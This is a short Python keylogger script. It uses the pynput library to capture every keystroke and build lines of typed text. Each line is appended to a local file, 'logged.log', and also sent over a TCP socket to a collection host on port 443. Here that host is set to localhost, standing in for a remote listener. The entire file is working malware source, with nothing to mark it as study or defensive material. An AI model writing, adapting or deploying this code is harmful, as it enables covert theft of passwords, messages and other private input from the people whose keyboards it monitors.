
from pynput import keyboard
import socket
# Press Keys or Release keys
## keyboard.Controller().press(keyboard.Key.f11)
ip = '127.0.0.1'
port = 443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))

arr = []

def key_press(key):    
    if (key == keyboard.Key.backspace and len(arr) > 0):
        arr.pop()
    elif (key == keyboard.Key.enter):
        arr.append("\n")
        word = ''.join(arr)
        write_out(word)
        s.send(word.encode())
        arr.clear()
        print (word)
    else:
        if (key == keyboard.Key.space):
            arr.append(" ")
        else:
            # pass as a string not a keycode so we can then join it in the array 
            arr.append(str(key).replace("'",''))

   
    if (key == keyboard.Key.ctrl_r):
        return False

def write_out(word):
    with open("logged.log", "a") as f:
        f.write(word)

with keyboard.Listener(on_press=key_press) as listener:
    key = listener.join()
    
